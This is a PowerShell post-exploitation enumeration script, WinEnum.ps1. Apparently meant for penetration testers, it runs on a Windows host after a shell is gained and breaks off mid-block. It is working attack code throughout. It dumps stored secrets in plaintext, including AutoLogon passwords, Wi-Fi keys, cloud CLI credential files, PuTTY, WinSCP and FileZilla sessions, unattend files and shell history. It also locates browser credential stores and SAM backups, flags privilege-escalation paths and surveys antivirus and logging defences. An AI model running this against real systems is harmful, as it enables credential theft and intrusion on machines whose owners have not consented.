<#
.SYNOPSIS
    WinEnum.ps1 - Windows post-exploitation enumeration & situational awareness.

.DESCRIPTION
    Runs common enumeration checks after obtaining a user-level shell on a
    Windows host and writes the results to a Markdown report in the current
    directory.

    FOR AUTHORIZED SECURITY TESTING ONLY. Only run against systems you own
    or are explicitly permitted to test.

    License: MIT.

.PARAMETER OutFile
    Optional output path. Defaults to WinEnum_<host>_<timestamp>.md.

.EXAMPLE
    powershell -ExecutionPolicy Bypass -File .\WinEnum.ps1
    powershell -ExecutionPolicy Bypass -File .\WinEnum.ps1 -OutFile C:\Temp\report.md
#>

param(
    [string]$OutFile = "",
    [switch]$Help
)

if ($Help) {
    Write-Host @"
WinEnum.ps1 - Windows post-exploitation enumeration

Usage:
  powershell -ExecutionPolicy Bypass -File .\WinEnum.ps1
  powershell -ExecutionPolicy Bypass -File .\WinEnum.ps1 -OutFile C:\Temp\report.md
  powershell -ExecutionPolicy Bypass -File .\WinEnum.ps1 -Help

Options:
  -OutFile <path>   Output path for the Markdown report.
  -Help             Show this help.

Output:
  Writes WinEnum_<host>_<timestamp>.md in the current directory by default.

WARNING: Authorized security testing only.
"@
    exit 0
}

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference  = "SilentlyContinue"

$HostName  = $env:COMPUTERNAME
$UserName  = "$env:USERDOMAIN\$env:USERNAME"
$TimeStamp = Get-Date -Format "yyyyMMdd-HHmmss"

if ([string]::IsNullOrWhiteSpace($OutFile)) {
    $OutFile = "WinEnum_${HostName}_${TimeStamp}.md"
}

$sb = [System.Text.StringBuilder]::new()

function Write-Rpt {
    param([string]$Text)
    [void]$sb.AppendLine($Text)
}

function Section {
    param([string]$Title)
    Write-Rpt ""
    Write-Rpt "## $Title"
    Write-Rpt ""
}

function Run {
    param(
        [Parameter(Mandatory = $true)][string]$Title,
        [Parameter(Mandatory = $true)][scriptblock]$Block
    )
    Write-Rpt ""
    Write-Rpt "### $Title"
    Write-Rpt '```'
    try {
        $out = & $Block 2>&1 | Out-String -Width 4096
        $out = $out.TrimEnd()
        if ([string]::IsNullOrWhiteSpace($out)) { Write-Rpt "(no output)" } else { Write-Rpt $out }
    } catch {
        Write-Rpt "ERROR: $($_.Exception.Message)"
    }
    Write-Rpt '```'
}

function Test-WritablePath {
    # Heuristic: does the current user (or a broadly-permissive principal)
    # have write access to this existing path?
    param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path) -or -not (Test-Path -LiteralPath $Path)) { return $false }
    try { $acl = Get-Acl -LiteralPath $Path -ErrorAction Stop } catch { return $false }
    $tokens = @(
        "$env:USERDOMAIN\$env:USERNAME", $env:USERNAME,
        'Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users',
        'S-1-1-0', 'S-1-5-32-545', 'S-1-5-11'
    )
    foreach ($rule in $acl.Access) {
        if ($rule.AccessControlType -ne 'Allow') { continue }
        $id = "$($rule.IdentityReference)"
        $matchesMe = $false
        foreach ($t in $tokens) { if ($t -and $id -like "*$t*") { $matchesMe = $true; break } }
        if (-not $matchesMe) { continue }
        if ("$($rule.FileSystemRights)" -match 'Write|Modify|FullControl|CreateFiles|AppendData|CreateDirectories') {
            return $true
        }
    }
    return $false
}

$script:Findings = New-Object System.Collections.ArrayList

function Add-Finding {
    param(
        [string]$Severity,
        [string]$Title,
        [string]$Evidence,
        [string[]]$Commands = @(),
        [string]$Note = ""
    )
    [void]$script:Findings.Add([pscustomobject]@{
        Severity = $Severity
        Title    = $Title
        Evidence = $Evidence
        Commands = $Commands
        Note     = $Note
    })
}

function Write-Findings {
    if ($script:Findings.Count -eq 0) {
        Write-Rpt ""
        Write-Rpt "_No automated findings were produced. Review the raw sections above manually._"
        return
    }
    $n = 0
    foreach ($f in $script:Findings) {
        $n++
        Write-Rpt ""
        Write-Rpt "### F$n [$($f.Severity)] $($f.Title)"
        Write-Rpt ""
        Write-Rpt "**Evidence**"
        Write-Rpt '```'
        Write-Rpt $f.Evidence.TrimEnd()
        Write-Rpt '```'
        if ($f.Note) {
            Write-Rpt ""
            Write-Rpt "> $($f.Note)"
        }
        if ($f.Commands -and $f.Commands.Count -gt 0) {
            Write-Rpt ""
            Write-Rpt "**Exploit / next steps**"
            Write-Rpt '```powershell'
            foreach ($c in $f.Commands) { Write-Rpt $c }
            Write-Rpt '```'
        }
    }
}

# ---------------------------------------------------------------------------
Write-Rpt "# Windows Enumeration Report"
Write-Rpt ""
Write-Rpt "> **Authorized security testing only.**"
Write-Rpt ""
Write-Rpt "| Field | Value |"
Write-Rpt "|---|---|"
Write-Rpt "| Host | $HostName |"
Write-Rpt "| User | $UserName |"
Write-Rpt "| Generated | $(Get-Date) |"

# ---------------------------------------------------------------------------
Section "1. System Information"

Run "OS version / build / architecture" {
    Get-CimInstance Win32_OperatingSystem |
        Select-Object Caption, Version, BuildNumber, OSArchitecture, InstallDate, LastBootUpTime |
        Format-List
}

Run "Computer / domain info" {
    Get-CimInstance Win32_ComputerSystem |
        Select-Object Manufacturer, Model, Domain, PartOfDomain, TotalPhysicalMemory |
        Format-List
}

Run "BIOS / system serial" {
    Get-CimInstance Win32_BIOS | Select-Object Manufacturer, SMBIOSBIOSVersion, SerialNumber | Format-List
}

Run "Full systeminfo" { systeminfo }

Run "Domain controller (if domain joined)" { nltest /dsgetdc: }

Run "PowerShell / .NET versions" {
    "PowerShell : $($PSVersionTable.PSVersion) ($($PSVersionTable.PSEdition))"
    "Build      : $($PSVersionTable.BuildVersion)"
    "CLR        : $($PSVersionTable.CLRVersion)"
    "OS         : $($PSVersionTable.OS)"
    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP' -ErrorAction SilentlyContinue |
        ForEach-Object {
            $rel = (Get-ItemProperty $_.PSPath -Name Release -ErrorAction SilentlyContinue).Release
            if ($rel) { ".NET Framework $($_.PSChildName): Release $rel" }
        }
}

Run "UAC configuration" {
    $u = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction SilentlyContinue
    $u | Select-Object EnableLUA, ConsentPromptBehaviorAdmin, ConsentPromptBehaviorUser, PromptOnSecureDesktop,
        LocalAccountTokenFilterPolicy, FilterAdministratorToken, EnableInstallerDetection, EnableSecureUIAPaths |
        Format-List
    if ($u.EnableLUA -eq 0) { ">>> UAC is DISABLED (EnableLUA=0)." }
    if ($u.LocalAccountTokenFilterPolicy -eq 1) { ">>> LocalAccountTokenFilterPolicy=1: remote local-admin logons receive a full token." }
}

# ---------------------------------------------------------------------------
Section "2. Current User & Privileges"

Run "whoami /all" { whoami /all }

Run "Token privileges" { whoami /priv }

Run "Current user groups" { whoami /groups }

Run "Environment variables" { Get-ChildItem Env: | Sort-Object Name | Format-Table -AutoSize }

# ---------------------------------------------------------------------------
Section "3. Local Users & Groups"

Run "Local users" {
    Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, LastLogon, Description | Format-Table -AutoSize
}

Run "Local administrators group" {
    Get-LocalGroupMember -Group "Administrators" | Format-Table -AutoSize
}

Run "Remote access groups" {
    net localgroup "Remote Desktop Users"
    net localgroup "Remote Management Users"
}

Run "All local groups" {
    Get-LocalGroup | Select-Object Name, Description | Format-Table -AutoSize
}

Run "Local password / lockout policy" { net accounts }

# ---------------------------------------------------------------------------
Section "4. Services"

Run "All services" {
    Get-CimInstance Win32_Service |
        Select-Object Name, DisplayName, State, StartMode, StartName, PathName |
        Format-Table -AutoSize
}

Run "Unquoted service paths" {
    Get-CimInstance Win32_Service | ForEach-Object {
        $p = $_.PathName
        if ($p -and $p.IndexOf(' ') -ge 0 -and -not $p.StartsWith('"')) {
            "$($_.Name) : $p"
        }
    }
}

Run "Services with non-standard StartName" {
    Get-CimInstance Win32_Service |
        Where-Object { $_.StartName -and $_.StartName -notmatch 'LocalSystem|NT AUTHORITY\\LocalService|NT AUTHORITY\\NetworkService' } |
        Select-Object Name, StartName, PathName, State | Format-Table -AutoSize
}

Run "Writable service binaries / directories (binary & DLL hijack)" {
    foreach ($s in Get-CimInstance Win32_Service) {
        $p = $s.PathName
        if (-not $p) { continue }
        $exe = $null
        if ($p -match '^\s*"([^"]+)"')          { $exe = $Matches[1] }
        elseif ($p -match '^\s*([A-Za-z]:\\[^"]*?\.exe)') { $exe = $Matches[1] }
        if (-not $exe) { continue }
        $exe = $exe.Trim()
        if (-not (Test-Path -LiteralPath $exe)) { continue }
        if (Test-WritablePath $exe) {
            "[WRITABLE BINARY] $($s.Name) -> $exe"
        } else {
            $dir = Split-Path -LiteralPath $exe -Parent
            if ($dir -and (Test-WritablePath $dir)) {
                "[WRITABLE DIR - DLL hijack] $($s.Name) -> $dir"
            }
        }
    }
}

Run "Unquoted service dirs - writability" {
    foreach ($s in Get-CimInstance Win32_Service) {
        $p = $s.PathName
        if (-not $p -or $p.StartsWith('"') -or $p -notmatch ' ') { continue }
        $dir = $p.Substring(0, $p.LastIndexOf('\'))
        if (-not $dir) { continue }
        $parts = $dir -split '\\'
        $acc = $parts[0]
        for ($i = 1; $i -lt $parts.Count; $i++) {
            $acc = "$acc\$($parts[$i])"
            if ($acc -match ' ' -and (Test-Path -LiteralPath $acc) -and (Test-WritablePath $acc)) {
                "[WRITABLE] $($s.Name) -> $acc"
            }
        }
    }
}

# ---------------------------------------------------------------------------
Section "5. Scheduled Tasks"

Run "Scheduled tasks" { schtasks /query /fo LIST /v }

# ---------------------------------------------------------------------------
Section "6. Installed Software & Patches"

Run "Installed programs" {
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
                     'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' |
        Where-Object { $_.DisplayName } |
        Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
        Sort-Object DisplayName | Format-Table -AutoSize
}

Run "Installed hotfixes / patches" {
    Get-HotFix | Sort-Object InstalledOn | Format-Table -AutoSize
}

Run "Windows Update policy" {
    Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -ErrorAction SilentlyContinue | Format-List
}

Run "Kernel drivers" {
    Get-CimInstance Win32_SystemDriver |
        Select-Object Name, DisplayName, State, StartMode, PathName |
        Sort-Object Name | Format-Table -AutoSize
}

Run "Windows features / roles installed" {
    if (Get-Command Get-WindowsFeature -ErrorAction SilentlyContinue) {
        Get-WindowsFeature | Where-Object Installed | Select-Object Name, DisplayName
    } else {
        Get-WindowsOptionalFeature -Online -ErrorAction SilentlyContinue |
            Where-Object State -eq 'Enabled' | Select-Object FeatureName
    }
}

# ---------------------------------------------------------------------------
Section "7. Credential & Configuration Artifacts"

Run "AutoLogon credentials" {
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' |
        Select-Object AutoAdminLogon, DefaultUserName, DefaultDomainName, DefaultPassword |
        Format-List
}

Run "AlwaysInstallElevated (MSI)" {
    $hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    $hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
    "HKLM AlwaysInstallElevated = $hklm"
    "HKCU AlwaysInstallElevated = $hkcu"
    if ($hklm -eq 1 -and $hkcu -eq 1) { ">>> Both set to 1: MSI installers run elevated (priv-esc vector)." }
}

Run "Stored credentials (cmdkey)" { cmdkey /list }

Run "Mapped drives / saved shares" { net use }

Run "PowerShell history" {
    $h = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
    "History path: $h"
    if ($h -and (Test-Path $h)) { Get-Content $h -Tail 200 }
}

Run "Unattended / sysprep / answer files" {
    $paths = @(
        'C:\Windows\Panther\unattend.xml',
        'C:\Windows\Panther\Unattend\unattend.xml',
        'C:\Windows\System32\Sysprep\unattend.xml',
        'C:\Windows\System32\Sysprep\unattend.txt',
        'C:\unattend.xml',
        'C:\sysprep.xml',
        'C:\sysprep.inf'
    )
    foreach ($p in $paths) {
        if (Test-Path $p) {
            "===== $p ====="
            Get-Content $p
            ""
        }
    }
}

Run "PSReadLine / console history files" {
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine" -Force -ErrorAction SilentlyContinue | Select-Object Name, Length, LastWriteTime
}

Run "Interesting files in user profile" {
    Get-ChildItem "$env:USERPROFILE" -Recurse -Include '*.ps1','*.kdbx','*.rdp','*.pem','*.key','*.ovpn','*password*','*credential*','*.config' -ErrorAction SilentlyContinue |
        Select-Object FullName, Length, LastWriteTime
}

Run "PuTTY saved sessions" {
    $root = 'HKCU:\SOFTWARE\SimonTatham\PuTTY\Sessions'
    if (Test-Path $root) {
        Get-ChildItem $root | ForEach-Object {
            "===== $($_.PSChildName) ====="
            (Get-ItemProperty $_.PSPath).PSObject.Properties |
                Where-Object { $_.Name -notmatch '^PS' } |
                ForEach-Object { "$($_.Name) = $($_.Value)" }
        }
    }
    "--- host keys ---"
    (Get-ItemProperty 'HKCU:\SOFTWARE\SimonTatham\PuTTY\SshHostKeys' -ErrorAction SilentlyContinue).PSObject.Properties |
        Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { "$($_.Name) = $($_.Value)" }
}

Run "VNC passwords / configuration" {
    foreach ($k in @(
        'HKLM:\SOFTWARE\RealVNC\WinVNC4',
        'HKLM:\SOFTWARE\TightVNC\Server',
        'HKLM:\SOFTWARE\ORL\WinVNC3\Default',
        'HKLM:\SOFTWARE\UltraVNC'
    )) {
        if (Test-Path $k) {
            "===== $k ====="
            (Get-ItemProperty $k).PSObject.Properties |
                Where-Object { $_.Name -notmatch '^PS' } |
                ForEach-Object { "$($_.Name) = $($_.Value)" }
        }
    }
}

Run "Wireless profiles + plaintext keys" {
    $profiles = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object {
        ($_.Line -split ':', 2)[1].Trim()
    }
    foreach ($p in $profiles) {
        "===== $p ====="
        netsh wlan show profile name="$p" key=clear
    }
}

Run "Browser credential / cookie stores" {
    $bases = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles"
    )
    foreach ($b in $bases) {
        if (Test-Path $b) {
            Get-ChildItem $b -Recurse -Force -Include 'Login Data','Cookies','Web Data','logins.json','key4.db','cookies.sqlite' -ErrorAction SilentlyContinue |
                Select-Object FullName, Length, LastWriteTime
        }
    }
}

Run "Certificates with private keys" {
    Get-ChildItem Cert:\CurrentUser\My, Cert:\LocalMachine\My -ErrorAction SilentlyContinue |
        Where-Object { $_.HasPrivateKey } |
        Select-Object Subject, Issuer, Thumbprint, NotAfter,
            @{ n = 'Exportable'; e = { try { $_.PrivateKey.CspKeyContainerInfo.Exportable } catch { $false } } } |
        Format-List
}

Run "WinSCP / FileZilla saved sessions" {
    foreach ($k in @(
        'HKCU:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions',
        'HKLM:\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions'
    )) {
        if (Test-Path $k) {
            "===== $k ====="
            Get-ChildItem $k | ForEach-Object {
                "--- $($_.PSChildName) ---"
                (Get-ItemProperty $_.PSPath).PSObject.Properties |
                    Where-Object { $_.Name -match 'HostName|UserName|Password|PortNumber|PublicKeyFile' } |
                    ForEach-Object { "$($_.Name) = $($_.Value)" }
            }
        }
    }
    $fz = "$env:APPDATA\FileZilla\recentservers.xml"
    if (Test-Path $fz) { "===== $fz ====="; Get-Content $fz }
}

Run "Cloud CLI credentials on disk" {
    foreach ($f in @(
        "$env:USERPROFILE\.aws\credentials",
        "$env:USERPROFILE\.aws\config",
        "$env:USERPROFILE\.azure\azureProfile.json",
        "$env:APPDATA\gcloud\credentials.db",
        "$env:USERPROFILE\.docker\config.json"
    )) {
        if (Test-Path $f) { "===== $f ====="; Get-Content $f }
    }
}

# ---------------------------------------------------------------------------
Section "8. Network"

Run "IP configuration" { ipconfig /all }

Run "Routing table" { route print }

Run "ARP cache" { arp -a }

Run "Listening TCP ports" {
    Get-NetTCPConnection -State Listen | Sort-Object LocalPort |
        Select-Object LocalAddress, LocalPort, OwningProcess | Format-Table -AutoSize
}

Run "UDP endpoints" {
    Get-NetUDPEndpoint | Sort-Object LocalPort |
        Select-Object LocalAddress, LocalPort, OwningProcess | Format-Table -AutoSize
}

Run "netstat -ano (process -> port)" { netstat -ano }

Run "Hosts file" { Get-Content "$env:SystemRoot\System32\drivers\etc\hosts" }

Run "DNS cache" { ipconfig /displaydns }

Run "NetBIOS / shares (net view)" { net view }

Run "Local shares (net share)" { net share }

Run "ARP neighbors" { Get-NetNeighbor -ErrorAction SilentlyContinue | Format-Table -AutoSize }

Run "SMB server configuration" {
    Get-SmbServerConfiguration -ErrorAction SilentlyContinue |
        Select-Object EnableSMB1Protocol, EnableSMB2Protocol, RequireSecuritySignature,
            EnableSecuritySignature, EncryptData, EnableInsecureGuestLogons |
        Format-List
}

Run "SMB shares + permissions" {
    Get-SmbShare -ErrorAction SilentlyContinue | ForEach-Object {
        "===== $($_.Name) :: $($_.Path) ====="
        Get-SmbShareAccess -Name $_.Name -ErrorAction SilentlyContinue |
            Select-Object AccountName, AccessControlType, AccessRight | Format-Table -AutoSize
    }
}

Run "SMB sessions / inbound connections" {
    Get-SmbSession -ErrorAction SilentlyContinue |
        Select-Object ClientComputerName, ClientUserName, Dialect, NumOpens
    "--- net session ---"
    net session
}

Run "RDP configuration" {
    Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -ErrorAction SilentlyContinue |
        Select-Object fDenyTSConnections, fSingleSessionPerUser | Format-List
    Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -ErrorAction SilentlyContinue |
        Select-Object PortNumber, UserAuthentication, SecurityLayer, MinEncryptionLevel | Format-List
}

Run "WinRM configuration" { winrm get winrm/config }

# ---------------------------------------------------------------------------
Section "9. Firewall & AV / EDR"

Run "Windows Firewall profile state" { netsh advfirewall show allprofiles }

Run "Firewall inbound allow rules" {
    Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True |
        Select-Object DisplayName, Profile, Action | Sort-Object DisplayName | Format-Table -AutoSize
}

Run "Installed AV products" {
    Get-CimInstance -Namespace 'root\SecurityCenter2' -ClassName AntiVirusProduct |
        Select-Object displayName, productState, pathToSignedProductExe | Format-List
}

Run "Windows Defender status" {
    Get-MpComputerStatus |
        Select-Object RealTimeProtectionEnabled, AntivirusEnabled, AMServiceEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled |
        Format-List
}

Run "AppLocker policy" {
    Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue |
        Select-Object -ExpandProperty RuleCollections
}

Run "LAPS" {
    Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft Services\AdmPwd' -ErrorAction SilentlyContinue | Format-List
}

Run "Defender exclusions" {
    $mp = Get-MpPreference -ErrorAction SilentlyContinue
    "--- ExclusionPath ---";      $mp.ExclusionPath
    "--- ExclusionExtension ---"; $mp.ExclusionExtension
    "--- ExclusionProcess ---";   $mp.ExclusionProcess
}

Run "Defender protection / tamper settings" {
    Get-MpPreference -ErrorAction SilentlyContinue |
        Select-Object DisableRealtimeMonitoring, DisableIOAVProtection, DisableBehaviorMonitoring,
            DisableBlockAtFirstSeen, MAPSReporting, SubmitSamplesConsent, PUAProtection |
        Format-List
}

Run "BitLocker status" { manage-bde -status }

Run "Device Guard / WDAC" {
    Get-CimInstance -Namespace 'root\Microsoft\Windows\DeviceGuard' -ClassName Win32_DeviceGuard -ErrorAction SilentlyContinue |
        Format-List
}

Run "PowerShell transcription policy" {
    Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue |
        Select-Object EnableTranscripting, OutputDirectory, EnableInvocationHeader | Format-List
    Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -ErrorAction SilentlyContinue |
        Select-Object EnableScriptBlockLogging | Format-List
}

# ---------------------------------------------------------------------------
Section "10. Filesystem & Writable Paths"

Run "Temp / writable dirs" {
    "TEMP = $env:TEMP"
    "TMP  = $env:TMP"
    Get-ChildItem "$env:TEMP" -Force -ErrorAction SilentlyContinue | Select-Object -First 50 Name, LastWriteTime
}

Run "Common dir ACLs" {
    foreach ($d in @('C:\Program Files','C:\Program Files (x86)','C:\Windows','C:\Windows\System32','C:\Temp')) {
        if (Test-Path $d) {
            "===== $d ====="
            icacls $d
        }
    }
}

Run "Startup folders" {
    Get-ChildItem 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Force -ErrorAction SilentlyContinue
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force -ErrorAction SilentlyContinue
}

Run "Registry persistence (Run / RunOnce keys)" {
    $keys = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    )
    foreach ($k in $keys) {
        $v = Get-ItemProperty $k -ErrorAction SilentlyContinue
        if ($v) {
            "===== $k ====="
            $v.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object { "$($_.Name) = $($_.Value)" }
        }
    }
}

Run "Privileges granted via security policy" {
    $cfg = Join-Path $env:TEMP "winenum_sec_$PID.cfg"
    secedit /export /cfg $cfg 2>&1 | Out-Null
    Get-Content $cfg -ErrorAction SilentlyContinue |
        Select-String -Pattern 'SeServiceLogonRight|SeAssignPrimaryToken|SeImpersonate|SeDebugPrivilege|SeTcbPrivilege|SeBackupPrivilege|SeRestorePrivilege|SeTakeOwnershipPrivilege'
    Remove-Item $cfg -Force -ErrorAction SilentlyContinue
}

Run "Accessibility binaries (sethc / utilman / osk hijack)" {
    foreach ($f in @('sethc.exe','utilman.exe','osk.exe','magnify.exe','narrator.exe','displayswitch.exe','atbroker.exe')) {
        $p = "$env:SystemRoot\System32\$f"
        if (Test-Path $p) {
            $i = Get-Item $p
            "$f : $($i.Length) bytes, modified $($i.LastWriteTime)"
            $acl = (Get-Acl $p).AccessToString -split "`n" |
                Where-Object { $_ -match 'Everyone|BUILTIN\\Users|Authenticated Users' }
            if ($acl) { "   ACL: $($acl -join '; ')" }
        }
    }
}

Run "AppInit_DLLs" {
    foreach ($k in @(
        'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows'
    )) {
        "===== $k ====="
        Get-ItemProperty $k -ErrorAction SilentlyContinue |
            Select-Object AppInit_DLLs, LoadAppInit_DLLs | Format-List
    }
}

Run "Winlogon Shell / Userinit" {
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue |
        Select-Object Shell, Userinit, Taskman, AppSetup | Format-List
}

Run "Image File Execution Options (debugger hijacks)" {
    Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options' -ErrorAction SilentlyContinue |
        ForEach-Object {
            $dbg = (Get-ItemProperty $_.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger
            if ($dbg) { "$($_.PSChildName) -> $dbg" }
        }
}

Run "WMI startup commands" {
    Get-CimInstance Win32_StartupCommand |
        Select-Object Name, Command, Location, User | Format-Table -AutoSize
}

Run "Disabled startup items (StartupApproved)" {
    foreach ($k in @(
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
    )) {
        $v = Get-ItemProperty $k -ErrorAction SilentlyContinue
        if ($v) {
            "===== $k ====="
            $v.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } |
                ForEach-Object { "$($_.Name) = $([BitConverter]::ToString($_.Value))" }
        }
    }
}

Run "Recent files / jump lists" {
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Force -ErrorAction SilentlyContinue |
        Select-Object Name, LastWriteTime | Sort-Object LastWriteTime -Descending | Select-Object -First 50
    "--- jump lists ---"
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations" -ErrorAction SilentlyContinue |
        Select-Object Name, Length | Select-Object -First 30
}

Run "WSL distributions" {
    if (Get-Command wsl -ErrorAction SilentlyContinue) { wsl -l -v }
    Get-ChildItem 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss' -ErrorAction SilentlyContinue |
        ForEach-Object {
            $p = Get-ItemProperty $_.PSPath
            "$($p.DistributionName) : $($p.BasePath)"
        }
}

Run "Group Policy startup / logon scripts" {
    foreach ($d in @(
        "$env:SystemRoot\System32\GroupPolicy\Machine\Scripts\Startup",
        "$env:SystemRoot\System32\GroupPolicy\Machine\Scripts\Shutdown",
        "$env:SystemRoot\System32\GroupPolicy\User\Scripts\Logon",
        "$env:SystemRoot\System32\GroupPolicy\User\Scripts\Logoff"
    )) {
        if (Test-Path $d) {
            "===== $d ====="
            Get-ChildItem $d -Recurse -File -ErrorAction SilentlyContinue |
                Select-Object FullName, Length, LastWriteTime
        }
    }
}

# ---------------------------------------------------------------------------
Section "11. Search for Credentials / Sensitive Files"

Run "Web / config files in common locations" {
    Get-ChildItem 'C:\inetpub','C:\xampp','C:\wamp','C:\wamp64','C:\Users' -Include 'web.config','*.config','*.conf','*.ini','*.xml','*.env','*.json' -Recurse -ErrorAction SilentlyContinue |
        Select-Object FullName, Length -First 200
}

Run "Password-like strings in AppData configs" {
    Get-ChildItem "$env:APPDATA","$env:LOCALAPPDATA" -Include '*.xml','*.config','*.ini','*.conf','*.json','*.txt' -Recurse -ErrorAction SilentlyContinue |
        Select-String -Pattern 'password|passwd|pwd|secret|token|api.?key' -List -ErrorAction SilentlyContinue |
        Select-Object -First 100 Path, LineNumber, Line
}

Run "Saved RDP / credential store files" {
    Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
    Get-ChildItem 'C:\Users' -Filter '*.rdp' -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
}

Run "IIS configuration (app pools / identities)" {
    $cfg = "$env:SystemRoot\System32\inetsrv\config\applicationHost.config"
    if (Test-Path $cfg) {
        Select-String -Path $cfg -Pattern 'applicationPool|identityType|userName=|password=|physicalPath' |
            Select-Object -First 120
    } else {
        "IIS config not found"
    }
}

Run "SAM / registry hive backups" {
    foreach ($p in @(
        "$env:SystemRoot\System32\config\SAM",
        "$env:SystemRoot\System32\config\SYSTEM",
        "$env:SystemRoot\System32\config\SECURITY",
        "$env:SystemRoot\Repair\SAM",
        "$env:SystemRoot\Repair\SYSTEM",
        "$env:SystemRoot\System32\config\RegBack\SAM",
        "$env:SystemRoot\System32\config\RegBack\SYSTEM"
    )) {
        if (Test-Path $p) {
            $i = Get-Item $p
            "$p : $($i.Length) bytes, modified $($i.LastWriteTime)"
            if (Test-WritablePath $p) { "  [WRITABLE]" }
        }
    }
}

# ---------------------------------------------------------------------------
Section "12. Processes, Sessions & Kerberos"

Run "Running processes (user / session)" { tasklist /v /fo table }

Run "Process command lines" {
    Get-CimInstance Win32_Process |
        Where-Object { $_.CommandLine } |
        Select-Object ProcessId, Name, CommandLine |
        Format-Table -AutoSize
}

Run "Logged-on users / sessions" { query user }

Run "Session details (qwinsta)" { qwinsta }

Run "Local account logon state" {
    Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet, PasswordExpires |
        Format-Table -AutoSize
}

Run "Kerberos tickets (current user)" { klist }

Run "Kerberos sessions" { klist sessions }

Run "Cached domain credentials (requires SYSTEM)" {
    Get-ItemProperty 'HKLM:\SECURITY\Cache' -ErrorAction SilentlyContinue |
        Select-Object * -ExcludeProperty PS* | Format-List
}

Run "RDP client history" {
    Get-ChildItem 'HKCU:\SOFTWARE\Microsoft\Terminal Server Client\Servers' -ErrorAction SilentlyContinue |
        ForEach-Object {
            $u = (Get-ItemProperty $_.PSPath -Name UsernameHint -ErrorAction SilentlyContinue).UsernameHint
            "$($_.PSChildName)  (user hint: $u)"
        }
    "--- Default.rdp ---"
    Get-Content "$env:USERPROFILE\Documents\Default.rdp" -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------------------
Section "13. Domain Membership (this host only)"

Run "Domain & machine account" {
    $cs = Get-CimInstance Win32_ComputerSystem
    $cs | Select-Object Domain, PartOfDomain, DomainRole, Name | Format-List
    if (-not $cs.PartOfDomain) { "Not domain joined (standalone)." }
}

Run "Domain controller & site for this host" {
    if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) {
        nltest /dsgetdc:$env:USERDNSDOMAIN
        "--- site ---"
        nltest /dsgetsite
    } else { "Not domain joined." }
}

Run "Applied Group Policy (RSoP) for this host/user" {
    if ((Get-CimInstance Win32_ComputerSystem).PartOfDomain) { gpresult /r }
    else { "Not domain joined." }
}

Run "Hybrid / Azure AD join status" {
